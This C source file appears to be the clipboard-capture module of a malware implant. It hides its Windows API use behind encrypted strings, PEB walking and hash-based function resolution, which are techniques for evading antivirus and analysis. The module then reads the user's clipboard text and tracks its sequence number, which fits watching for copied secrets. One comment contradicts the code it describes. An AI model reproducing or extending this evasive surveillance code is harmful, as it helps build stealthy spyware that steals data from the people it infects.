#include "clipboard.h"
#include "config.h"
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "enc_strings.h"
#include <windows.h>

/* ── Inline helpers for encrypted PEB-walk resolution ──────── */
static inline void *resolve_mod_enc(const uint8_t *enc, size_t len) {
    char buf[32]; enc_decrypt(enc, len, buf);
    return mirage_get_module_by_hash(mirage_encrypted_hash_module(buf));
}
static inline void *resolve_fn_enc(void *mod, const uint8_t *enc, size_t len) {
    char buf[32]; enc_decrypt(enc, len, buf);
    return mirage_get_function_by_hash(mod, mirage_encrypted_hash_func(buf));
}


#ifdef ENABLE_CLIPBOARD

#define CF_UNICODETEXT 13

/* ── API function pointer types (user32.dll) ────────────────────── */

typedef BOOL   (WINAPI *pOpenClipboard)(HWND);
typedef BOOL   (WINAPI *pCloseClipboard)(void);
typedef HANDLE (WINAPI *pGetClipboardData)(UINT);
typedef LPVOID (WINAPI *pGlobalLock)(HGLOBAL);
typedef BOOL   (WINAPI *pGlobalUnlock)(HGLOBAL);
typedef BOOL   (WINAPI *pEmptyClipboard)(void);
typedef HANDLE (WINAPI *pSetClipboardData)(UINT, HANDLE);
typedef HGLOBAL(WINAPI *pGlobalAlloc)(UINT, SIZE_T);
typedef DWORD  (WINAPI *pGetClipboardSequenceNumber)(void);

/* ── Resolved API pointers (lazy-initialized once) ──────────────── */

static struct {
    pOpenClipboard          pOpen;
    pCloseClipboard         pClose;
    pGetClipboardData       pGetData;
    pGlobalLock             pLock;
    pGlobalUnlock           pUnlock;
    pEmptyClipboard         pEmpty;
    pSetClipboardData       pSetData;
    pGlobalAlloc            pAlloc;
    pGetClipboardSequenceNumber pGetSeq;
    int                     ready;
} cl_api;

static int cl_ensure_api(void) {
    if (cl_api.ready) return 1;

    char dll[32];
    enc_decrypt(enc_user32, ENC_USER32_LEN, dll);
    void *u32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!u32) return 0;

    char fn[32];

    enc_decrypt(enc_OpenClipboard, ENC_OPENCLIPBOARD_LEN, fn);
    cl_api.pOpen = (pOpenClipboard)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_CloseClipboard, ENC_CLOSECLIPBOARD_LEN, fn);
    cl_api.pClose = (pCloseClipboard)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_GetClipboardData, ENC_GETCLIPBOARDDATA_LEN, fn);
    cl_api.pGetData = (pGetClipboardData)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_GlobalLock, ENC_GLOBALLOCK_LEN, fn);
    cl_api.pLock = (pGlobalLock)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_GlobalUnlock, ENC_GLOBALUNLOCK_LEN, fn);
    cl_api.pUnlock = (pGlobalUnlock)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_EmptyClipboard, ENC_EMPTYCLIPBOARD_LEN, fn);
    cl_api.pEmpty = (pEmptyClipboard)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_SetClipboardData, ENC_SETCLIPBOARDDATA_LEN, fn);
    cl_api.pSetData = (pSetClipboardData)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_GlobalAlloc, ENC_GLOBALALLOC_LEN, fn);
    cl_api.pAlloc = (pGlobalAlloc)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));

    /* GetClipboardSequenceNumber — not yet in enc_strings.h; use hash directly */
    cl_api.pGetSeq = (pGetClipboardSequenceNumber)resolve_fn_enc(u32, enc_GetClipboardSequenceNumber, ENC_GETCLIPBOARDSEQUENCENUMBER_LEN);

    if (!cl_api.pOpen || !cl_api.pClose || !cl_api.pGetData ||
        !cl_api.pLock || !cl_api.pUnlock)
        return 0;

    cl_api.ready = 1;
    return 1;
}

/* ── Helpers ────────────────────────────────────────────────────── */

static int u32_to_utf8(unsigned int cp, unsigned char *out) {
    if (cp < 0x80) {
        out[0] = (unsigned char)cp;
        return 1;
    } else if (cp < 0x800) {
        out[0] = (unsigned char)(0xC0 | (cp >> 6));
        out[1] = (unsigned char)(0x80 | (cp & 0x3F));
        return 2;
    } else if (cp < 0x10000) {
        out[0] = (unsigned char)(0xE0 | (cp >> 12));
        out[1] = (unsigned char)(0x80 | ((cp >> 6) & 0x3F));
        out[2] = (unsigned char)(0x80 | (cp & 0x3F));
        return 3;
    } else {
        out[0] = (unsigned char)(0xF0 | (cp >> 18));
        out[1] = (unsigned char)(0x80 | ((cp >> 12) & 0x3F));
        out[2] = (unsigned char)(0x80 | ((cp >> 6) & 0x3F));
        out[3] = (unsigned char)(0x80 | (cp & 0x3F));
        return 4;
    }
}

int clipboard_get_text(char *buf, size_t buf_len) {
    if (!buf || buf_len == 0) return -1;
    buf[0] = '\0';

    if (!cl_ensure_api()) return -1;

    if (!cl_api.pOpen(NULL))
        return -1;

    HANDLE h_mem = cl_api.pGetData(CF_UNICODETEXT);
    if (!h_mem) {
        cl_api.pClose();
        return -1;
    }

    const wchar_t *wstr = (const wchar_t *)cl_api.pLock(h_mem);
    if (!wstr) {
        cl_api.pClose();
        return -1;
    }

    size_t pos = 0;
    const wchar_t *p = wstr;

    while (*p && pos < buf_len - 1) {
        unsigned int cp = (unsigned int)*p;

        if (cp >= 0xD800 && cp <= 0xDBFF && p[1] >= 0xDC00 && p[1] <= 0xDFFF) {
            cp = 0x10000 + ((cp - 0xD800) << 10) + ((unsigned int)p[1] - 0xDC00);
            p++;
        }
        p++;

        unsigned char utf8[4];
        int n = u32_to_utf8(cp, utf8);
        if (pos + (size_t)n >= buf_len - 1)
            break;

        for (int i = 0; i < n; i++)
            buf[pos++] = (char)utf8[i];
    }
    buf[pos] = '\0';

    cl_api.pUnlock(h_mem);
    cl_api.pClose();
    return 0;
}

unsigned int clipboard_get_sequence(void) {
    if (!cl_ensure_api()) return 0;
    if (!cl_api.pGetSeq) return 0;
    return (unsigned int)cl_api.pGetSeq();
}

#endif /* ENABLE_CLIPBOARD */
